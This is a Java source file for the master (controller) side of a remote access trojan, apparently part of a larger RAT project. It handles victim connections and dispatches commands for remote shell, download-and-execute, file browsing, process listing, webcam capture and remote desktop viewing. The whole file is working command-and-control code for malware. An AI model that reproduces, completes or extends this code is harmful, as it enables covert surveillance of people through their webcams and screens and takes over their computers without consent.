package rat.master;

import org.jboss.netty.channel.*;
import rat.master.gui.frames.MainRATWindow;
import rat.master.gui.frames.MainWindowObserver;
import rat.packets.*;

import javax.swing.*;
import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class MasterConnectionHandler extends SimpleChannelUpstreamHandler implements MainWindowObserver {

    private MainRATWindow mainRATWindow;

    private Server server;

    private static Map<Channel, ClientController> clients = new HashMap<>();

    public MasterConnectionHandler(Server server) {
        this.server = Objects.requireNonNull(server);
    }

    public void startRATGUI() {
        try {
            SwingUtilities.invokeAndWait(() -> {
                mainRATWindow = new MainRATWindow();
                mainRATWindow.register(this);
            });
        } catch (InterruptedException | InvocationTargetException e) {
            e.printStackTrace();
            return;
        }
    }

    public static void disconnectClients(int port) {
        for (Map.Entry<Channel, ClientController> client : clients.entrySet()) {
            InetSocketAddress socketAddress = (InetSocketAddress) client.getKey().getLocalAddress();
            System.out.println("Loop: " + socketAddress.getHostString() + " " + socketAddress.getPort());
            if (socketAddress.getPort() == port) {
                System.out.println("Closing: " + socketAddress.getHostString() + " " + socketAddress.getPort());
                client.getKey().close();
            }
        }
    }

    @Override
    public void mainWindowRequest(ClientController clientController, String operation) {

//        if (operation.equals("record")) {
//            clientController.startScreenRecord();
//
//        } else
        if (operation.equals("openWebsiteGUI")) {
            clientController.openWebsiteGUI();

        } else if (operation.equals("fileBrowserGUI")) {
            clientController.openFileBrowserGUI();

        } else if (operation.equals("processListGUI")) {
            clientController.openProcessListGUI();

        } else if (operation.equals("startChatGUI")) {
            clientController.openChatGUI();

        } else if (operation.equals("startMessageBoxGUI")) {
            clientController.openMessageBoxGUI();

        } else if (operation.equals("startDownloadExecuteGUI")) {
            clientController.openDownloadExecuteGUI();

        } else if (operation.equals("startRemoteShellGUI")) {
            clientController.openRemoteShellGUI();

        } else if (operation.equals("startWebcamListGUI")) {
//            clientController.startWebcamGUI();
            clientController.startWebcamListGUI();

        } else if (operation.equals("startRemoteDesktopListGUI")) {
            clientController.startRemoteDesktopListGUI();

        }

    }

    @Override
    public void bindPortRequest(int connectionPort, int transferPort) throws Exception {
        server.bindPort(connectionPort);
//        server.startFileReciever(transferPort);
    }

    @Override
    public void unbindPortRequest(int connectionPort, int transferPort) {
        server.unbindPort(connectionPort);
//        server.finishFileReciever();
    }

    @Override
    public void channelConnected(ChannelHandlerContext ctx, ChannelStateEvent e) throws Exception {
        ClientController clientController = new ClientController(e.getChannel());
        clients.put(e.getChannel(), clientController);
        mainRATWindow.clientConnected(clientController);
    }

    @Override
    public void channelDisconnected(ChannelHandlerContext ctx, ChannelStateEvent e) throws Exception {
        ClientController clientController = clients.get(e.getChannel());
        clients.remove(e.getChannel());
        mainRATWindow.clientDisconnected(clientController);
    }

    @Override
    public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) {
        IPacket packet = (IPacket) e.getMessage();

        ClientController clientController = clients.get(e.getChannel());
        ClientModel clientModel = clientController.getModel();
        ClientView clientView = clientController.getView();

        if (packet.getPacketType() == PacketType.INFORMATION_DATA) {
            clientModel.setInformationPacket((BasicInformationPacket) packet);

        } else if (packet.getPacketType() == PacketType.SCREENSHOT_DATA) {
            clientView.updateRemoteDesktopScreenGUI((ScreenshotDataPacket) packet);

        } else if (packet.getPacketType() == PacketType.DIRECTORY_LISTING) {
            clientView.getFileBrowserGUI().getTableModel().directoryChanged((DirectoryListingPacket) packet);

        } else if (packet.getPacketType() == PacketType.PROCESS_LIST) {
            clientView.getProcessListGUI().getTableModel().processListChanged((ProcessListPacket) packet);

        } else if (packet.getPacketType() == PacketType.DRIVE_LISTING) {
            clientView.getFileBrowserGUI().getDriveTableModel().drivesChanged((DriveListingPacket) packet);

        } else if (packet.getPacketType() == PacketType.FILE_DATA) {
            // TODO: get client path from ClientModel
            //FileManager.storeData((FileDataPacket) packet);
            // clientView.updateDownloadManagerTable((FileDataPacket) packet);

        } else if (packet.getPacketType() == PacketType.CHAT_MESSAGE) {
            ChatMessagePacket chatMessagePacket = (ChatMessagePacket) packet;
            clientController.openChatGUI();
            clientView.getChatGUI().messageReceived(chatMessagePacket.getMessage());

        } else if (packet.getPacketType() == PacketType.REMOTE_SHELL_DATA) {
            RemoteShellResponsePacket shellResponsePacket = (RemoteShellResponsePacket) packet;
            clientView.getRemoteShellGUI().responseReceived(shellResponsePacket.getResponse());


        } else if (packet.getPacketType() == PacketType.WEBCAM_LIST) {
            clientView.updateWebcamListGUI((WebcamInfoPacket) packet);

        } else if (packet.getPacketType() == PacketType.WEBCAM_DATA) {
            clientView.updateWebcamGUI((WebcamDataPacket) packet);

        } else if (packet.getPacketType() == PacketType.WEBCAM_INFO) {
            clientView.updateWebcamJobId((WebcamInfoPacket) packet);


        } else if (packet.getPacketType() == PacketType.DESKTOP_LIST) {
            clientView.updateRemoteDesktopListGUI((DesktopInfoPacket) packet);

        } else if (packet.getPacketType() == PacketType.DESKTOP_DATA) {
            clientView.updateRemoteDesktopGUI((DesktopDataPacket) packet);

        } else if (packet.getPacketType() == PacketType.DESKTOP_INFO) {
            clientView.updateRemoteDesktopJobId((DesktopInfoPacket) packet);

        }
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, ExceptionEvent e) {
        e.getCause().printStackTrace();
        e.getChannel().close();
    }
}
